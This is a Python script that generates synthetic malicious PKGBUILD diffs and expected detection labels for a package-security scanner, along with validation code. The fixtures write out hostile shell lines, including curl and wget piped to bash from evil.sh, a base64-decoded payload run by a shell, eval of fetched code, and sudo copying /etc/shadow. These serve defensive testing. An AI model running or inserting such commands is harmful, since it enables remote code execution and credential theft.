"""Generate malicious synthetic fixtures + expected.json.

Usage:
    python scripts/gen_malicious_fixtures.py [--out tests/fixtures/malicious/synthetic]

Labels are validated against the *shipped* config with a cold database,
exactly the context the calibration gates measure, so what this script
writes is what ``calibration_gates.py`` will check.

Record-preserving: this script owns its FIXTURES entries only. It never
deletes .diff files it does not own, and for keys that already exist in
expected.json it keeps the committed (hand-reconciled) entry verbatim.
The committed record is the source of truth; edit expected.json (and this
script's ``expect``) together when labels legitimately change.
"""

import argparse
import json
import sys
from pathlib import Path

from calibration_gates import shipped_config
from trustsight.analysis import scan_diff
from trustsight.rules import load_rules


FIXTURES: list[dict] = []


def add(name: str, diff_text: str, **expect):
    FIXTURES.append({
        "name": name,
        "diff_text": diff_text,
        "expect": expect,
    })


# ── Header template ──────────────────────────────────────────────────────────

def header(pkgname="malicious-pkg", func="build"):
    return f"""--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
 # Maintainer: Alice <alice@example.com>
-pkgname={pkgname}
+pkgname={pkgname}
 pkgver=1.0
+"""


# ── R001: curl|bash variants ─────────────────────────────────────────────────

add("R001-curl-pipe-bash",
    header() + "curl https://evil.sh | bash\n",
    must_fire=["R001"], min_score=40, max_score=70)

add("R001-curl-pipe-sh",
    header() + "curl https://evil.sh | sh\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-dash",
    header() + "curl -s https://evil.sh | dash\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-zsh",
    header() + "curl -f https://evil.sh | zsh\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-source-stdin",
    header() + "curl https://evil.sh | source /dev/stdin\n",
    must_fire=["R001"], min_score=40)

add("R001-curl-pipe-python",
    header() + "curl -sS https://evil.py | python\n",
    must_fire=["R001"], min_score=40)

add("R001-wget-pipe-bash",
    header() + "wget -qO- https://evil.sh | bash\n",
    must_fire=["R002"], min_score=40)

add("R001-wget-pipe-sh",
    header() + "wget https://evil.sh | sh\n",
    must_fire=["R002"], min_score=40)

# ── R003: base64 decode ──────────────────────────────────────────────────────

add("R003-base64-decode-bash",
    header() + "echo 'bWFsb2Npb3Vz' | base64 -d | bash\n",
    must_fire=["R003"], min_score=40)

add("R003-base64-decode-sh",
    header() + "base64 --decode <<< 'bWFsb2Npb3Vz' | sh\n",
    must_fire=["R003"], min_score=40)

# ── R004: SKIP checksum variants ─────────────────────────────────────────────

add("R004-skip-https-bare",
    header() + "sha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz')\n",
    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)

add("R004-skip-https-named",
    header() + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo/archive/v1.0.tar.gz')\n",
    must_fire=["R004"], must_not_fire=["R012", "R013"], min_score=25)

add("R004-skip-git-justified",
    header() + "sha256sums=('SKIP')\nsource=('git+https://github.com/user/repo.git')\n",
    must_fire=["R004"], min_score=25)

add("R004-skip-git-pkgname",
    header(pkgname="evil-pkg-git") + "sha256sums=('SKIP')\nsource=('https://github.com/user/repo.git')\n",
    must_fire=["R004"], min_score=25)

add("R004-skip-validpgpkeys",
    header() + "validpgpkeys=('DEADBEEF1234')\nsha256sums=('SKIP')\nsource=('https://example.com/pkg.tar.gz.asc')\n",
    must_fire=[], must_not_fire=["R004", "R012", "R013"])

add("R004-skip-indexed",
    header() + "sha256sums=('SKIP' 'deadbeef' 'cafebabe')\n",
    must_fire=["R004"], min_score=25)

# ── R005: empty checksum ─────────────────────────────────────────────────────

add("R005-empty-checksum",
    header() + "sha256sums=()\n",
    must_fire=["R005"], min_score=25)

# ── R006: http URL ───────────────────────────────────────────────────────────

add("R006-http-url",
    header() + "source=('http://example.com/pkg.tar.gz')\n",
    must_fire=["R006"], must_not_fire=["R012", "R013"], min_score=15)

add("R006-https-url",
    header() + "source=('https://example.com/pkg.tar.gz')\n",
    must_not_fire=["R006", "R012", "R013"])

# ── R007: .install modifications ─────────────────────────────────────────────

add("R007-install-added",
    header() + "install=malicious-pkg.install\n",
    must_fire=["R007"], min_score=15)

add("R007-install-modified",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
# Maintainer: Alice <alice@example.com>
pkgname=malicious-pkg
pkgver=1.0
+install=malicious-pkg.install
""",
    must_fire=["R007"], min_score=15)

# ── R008: python/ruby -c with URL ────────────────────────────────────────────

add("R008-python-c-url",
    header() + "python -c https://evil.com/payload.py\n",
    must_fire=["R008"], min_score=25)

add("R008-ruby-e-url",
    header() + "ruby -c https://evil.com/payload.rb\n",
    must_fire=["R008"], min_score=25)

# ── R009: sudo ────────────────────────────────────────────────────────────────

# The sudo must be an added line *inside* an added build() body: R009 is
# scoped to build/install functions, and a top-level sudo runs at source
# time, which is a different claim (R129 territory, not R009's).
add("R009-sudo-in-build",
    header() + "build() {\n+    sudo cp /etc/shadow /tmp/out\n+}\n",
    must_fire=["R009"], min_score=40, max_score=70)

# ── R129: top-level (parse-time) fetch ───────────────────────────────────────

add("R010-curl-fetch",
    header() + "curl -O https://example.com/pkg.tar.gz\n",
    must_fire=["R129"], min_score=25)

add("R011-wget-fetch",
    header() + "wget https://example.com/pkg.tar.gz\n",
    must_fire=["R129"], min_score=25)

# ── R130: signing-key set changed (INFO fact) ────────────────────────────────

add("R014-validpgpkeys-added",
    header() + "validpgpkeys=('DEADBEEF1234')\n",
    must_fire=["R130"])

# ── D-series: dependency additions ───────────────────────────────────────────

# R015 is a reserved ID (docs/reference/rules.md).  A plain depends addition
# is reported as a fact and scored only by the stateful D001 (novelty needs a
# seeded corpus), so under the gates' cold DB it is silent by design.
add("R015-depends-added",
    header() + "depends=('evil-pkg' 'another-pkg')\n")

add("R016-makedepends-added",
    header() + "makedepends=('go' 'nodejs')\n",
    must_fire=["D003"], min_score=10)

# Same cold-start silence as R015: an optdepends addition is reported, never
# scored without corpus state.
add("R016-optdepends-added",
    header() + "optdepends=('evil-pkg: for the malicious feature')\n")

# ── R059: chmod +s ───────────────────────────────────────────────────────────

add("R017-chmod-suid",
    header() + "chmod +s /usr/bin/elevate\n",
    must_fire=["R059"], min_score=25)

add("R017-chmod-sgid",
    header() + "chmod g+s /usr/bin/elevate\n",
    must_fire=["R059"], min_score=25)

# ── R128: build function writes outside $pkgdir ──────────────────────────────

add("R018-ln-sf",
    header() + "ln -sf /usr/bin/elevate /usr/local/bin/normal\n",
    must_fire=["R128"], min_score=15)

# ── R131: suspicious environment variable ────────────────────────────────────

add("R019-cflags-suspicious",
    header() + 'CFLAGS="-O2 -funroll-loops -march=native -fomit-frame-pointer"\n',
    must_fire=["R131"], min_score=10)

# ── R039/R129: eval/exec ──────────────────────────────────────────────────────

add("R025-eval",
    header() + 'eval "$(curl -s https://evil.com/payload)"\n',
    must_fire=["R039"], min_score=30)

add("R025-exec",
    header() + 'exec "$(wget -qO- https://evil.com/payload)"\n',
    must_fire=["R129"], min_score=30)

# ── R004/R005: checksum changes ──────────────────────────────────────────────

add("R026-checksum-to-skip",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
# Maintainer: Alice <alice@example.com>
pkgname=malicious-pkg
pkgver=1.0
-sha256sums=('deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe1234')
+sha256sums=('SKIP')
""",
    must_fire=["R004"], min_score=25)

add("R027-checksum-emptied",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
# Maintainer: Alice <alice@example.com>
pkgname=malicious-pkg
pkgver=1.0
-sha256sums=('deadbeef')
+sha256sums=()
""",
    must_fire=["R005"], min_score=25)


# ── Controls ─────────────────────────────────────────────────────────────────

add("control-benign-version-bump",
    """--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,3 +1,5 @@
# Maintainer: Alice <alice@example.com>
pkgname=benign-pkg
-pkgver=1.0
+pkgver=1.1
""",
    must_fire=[], must_not_fire=["R001", "R002", "R003", "R004", "R005",
                                  "R006", "R007", "R008", "R009", "R012",
                                  "R013", "R025", "R026", "R027"])


def main():
    parser = argparse.ArgumentParser(description="Generate malicious synthetic fixtures")
    parser.add_argument("--out", type=Path,
                        default=Path(__file__).resolve().parent.parent
                        / "tests" / "fixtures" / "malicious" / "synthetic")
    args = parser.parse_args()

    args.out.mkdir(parents=True, exist_ok=True)

    # Record-preserving: never delete a .diff this script does not own.
    # Owned fixtures are overwritten below; anything else (injection R012/R013
    # fixtures, legacy curated bodies) is left untouched so regeneration can
    # never destroy committed state.
    expected = {}
    failures = []

    existing_exp = args.out / "expected.json"
    existing = {}
    if existing_exp.exists():
        with open(existing_exp) as f:
            existing = json.load(f)

    # Labels must agree with the gates, so validate with the same context:
    # shipped config, cold database, and the fixture's own name as the
    # package name (which is what scan_malicious passes).
    with shipped_config():
        rules = load_rules()

        for fx in FIXTURES:
            fname = fx["name"] + ".diff"
            fpath = args.out / fname

            fpath.write_text(fx["diff_text"])

            try:
                fact = scan_diff(fx["diff_text"], rules=rules,
                                 package_name=fx["name"])
            except Exception as exc:
                failures.append(f"{fname}: scan_diff raised: {exc}")
                continue

            fired = {e.rule_id for e in fact.score_breakdown}
            must = set(fx["expect"].get("must_fire", []))
            must_not = set(fx["expect"].get("must_not_fire", []))
            min_s = fx["expect"].get("min_score", 0)
            max_s = fx["expect"].get("max_score", 100)

            missed = must - fired
            if missed:
                failures.append(f"{fname}: {missed} should fire, didn't. Fired: {fired}")
            fired_wrong = must_not & fired
            if fired_wrong:
                failures.append(f"{fname}: {fired_wrong} should NOT fire")
            if fact.final_score < min_s:
                failures.append(f"{fname}: score {fact.final_score} < {min_s}")
            if fact.final_score > max_s:
                failures.append(f"{fname}: score {fact.final_score} > {max_s}")

            entry = {}
            if must:
                entry["must_fire"] = sorted(must)
            if must_not:
                entry["must_not_fire"] = sorted(must_not)
            if min_s > 0:
                entry["min_score"] = min_s
            if max_s < 100:
                entry["max_score"] = max_s

            if fname in existing:
                # The committed record is authoritative: keep it verbatim and
                # only add review notes the record lacks. This is what makes
                # regeneration safe against hand-reconciled labels.
                curated = dict(existing[fname])
                for note_key in ("relabelled", "description"):
                    if note_key in entry and note_key not in curated:
                        curated[note_key] = entry[note_key]
                entry = curated

            expected[fname] = entry

    # Merge with fixtures owned by other generators (injection R012/R013,
    # legacy curated keys); carry review notes forward so regeneration never
    # erases the review trail.
    for k, v in existing.items():
        if k not in expected:
            expected[k] = v
        else:
            for note_key in ("relabelled", "description"):
                if note_key in v and note_key not in expected[k]:
                    expected[k][note_key] = v[note_key]

    # Stable key order so regeneration is byte-identical regardless of the
    # order generators ran in.
    expected = {k: expected[k] for k in sorted(expected)}

    with open(args.out / "expected.json", "w") as f:
        json.dump(expected, f, indent=2, ensure_ascii=False)
        f.write("\n")

    for fname in sorted(expected):
        print(f"  {fname}")

    if failures:
        print(f"\nFAILURES ({len(failures)}):", file=sys.stderr)
        for fb in failures:
            print(f"  {fb}", file=sys.stderr)
        sys.exit(1)
    else:
        print(f"\nAll {len(FIXTURES)} new fixtures pass validation. "
              f"Total synthetic fixtures: {len(expected)}")


if __name__ == "__main__":
    main()
